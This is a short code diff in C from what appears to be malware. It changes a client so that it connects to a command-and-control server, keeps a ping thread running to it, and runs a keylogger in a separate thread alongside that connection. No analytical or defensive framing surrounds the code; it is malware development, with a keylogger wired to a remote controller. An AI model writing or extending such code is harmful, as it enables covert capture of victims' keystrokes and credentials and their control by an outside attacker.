@@ -20,24 +20,30 @@ void *inf_ping(void *socket_desc)
 		sleep(1);
 	}
 
+	return NULL;
+}
+
+void *keylogger()
+{
+	init_keylogger();
+
+	return NULL;
 }
 
 int main()
 {
 	int socket_desc = 0;
 	struct sockaddr_in server;
-	
-	init_keylogger();
-	return 0;
 
 	memset(&server, 0, sizeof(server));
 	
-	pthread_t thread_id;
+	pthread_t thread_id_ping, thread_id_keylogger;
 
 	if (connect_cc(IP_ADDR, PORT + 1, &socket_desc, &server, 0) == ERROR)
 		return ERROR;
 
-	pthread_create(&thread_id, NULL, inf_ping, &socket_desc);
+	pthread_create(&thread_id_ping, NULL, inf_ping, &socket_desc);
+	pthread_create(&thread_id_keylogger, NULL, keylogger, NULL);
 
 	while (1)
 	{
